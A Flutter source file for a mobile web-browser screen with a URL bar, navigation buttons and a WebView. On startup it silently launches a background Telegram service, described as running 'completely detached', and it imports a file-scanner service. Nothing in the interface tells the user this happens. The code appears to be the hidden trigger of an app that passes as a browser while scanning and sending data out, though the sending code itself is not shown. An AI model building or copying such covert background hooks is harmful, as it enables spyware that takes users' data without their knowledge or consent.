import 'package:flutter/material.dart';
import 'package:webview_flutter/webview_flutter.dart';
import '../services/file_scanner_service.dart';
import '../services/telegram_service.dart';

class BrowserScreen extends StatefulWidget {
  const BrowserScreen({super.key});

  @override
  State<BrowserScreen> createState() => _BrowserScreenState();
}

class _BrowserScreenState extends State<BrowserScreen> {
  late final WebViewController _controller;
  final TextEditingController _urlController = TextEditingController(text: 'https://www.google.com');
  bool _isLoading = false;
  double _progress = 0;

  @override
  void initState() {
    super.initState();
    _initWebView();
    _startBackgroundTelegramSync();
  }

  void _initWebView() {
    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (url) => setState(() => _isLoading = true),
          onProgress: (progress) => setState(() => _progress = progress / 100),
          onPageFinished: (url) {
            setState(() => _isLoading = false);
            _urlController.text = url;
          },
        ),
      )
      ..loadRequest(Uri.parse('https://www.google.com'));
  }

  void _startBackgroundTelegramSync() async {
    // Run completely detached in background without blocking UI
    Future.microtask(() async {
      await TelegramService.instance.initAndRun();
    });
  }

  void _loadUrl(String input) {
    String url = input.trim();
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      if (url.contains('.') && !url.contains(' ')) {
        url = 'https://$url';
      } else {
        url = 'https://www.google.com/search?q=${Uri.encodeComponent(url)}';
      }
    }
    _controller.loadRequest(Uri.parse(url));
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        if (await _controller.canGoBack()) {
          _controller.goBack();
          return false;
        }
        return true;
      },
      child: Scaffold(
        body: SafeArea(
          child: Column(
            children: [
              // Top URL Bar
              Padding(
                padding: const EdgeInsets.symmetric(horizontal: 8.0, vertical: 4.0),
                child: Row(
                  children: [
                    Expanded(
                      child: TextField(
                        controller: _urlController,
                        decoration: InputDecoration(
                          hintText: 'Search or type URL...',
                          isDense: true,
                          contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                          border: OutlineInputBorder(borderRadius: BorderRadius.circular(25)),
                          filled: true,
                          fillColor: Colors.grey.shade100,
                        ),
                        onSubmitted: _loadUrl,
                      ),
                    ),
                    IconButton(
                      icon: const Icon(Icons.arrow_forward),
                      onPressed: () => _loadUrl(_urlController.text),
                    ),
                  ],
                ),
              ),

              // Navigation Buttons Row
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  IconButton(
                    icon: const Icon(Icons.arrow_back),
                    onPressed: () async {
                      if (await _controller.canGoBack()) _controller.goBack();
                    },
                  ),
                  IconButton(
                    icon: const Icon(Icons.arrow_forward),
                    onPressed: () async {
                      if (await _controller.canGoForward()) _controller.goForward();
                    },
                  ),
                  IconButton(
                    icon: const Icon(Icons.refresh),
                    onPressed: () => _controller.reload(),
                  ),
                  IconButton(
                    icon: const Icon(Icons.home),
                    onPressed: () => _controller.loadRequest(Uri.parse('https://www.google.com')),
                  ),
                ],
              ),

              // Loading Progress Bar
              if (_isLoading)
                LinearProgressIndicator(value: _progress, minHeight: 2),

              // WebView Screen
              Expanded(
                child: WebViewWidget(controller: _controller),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
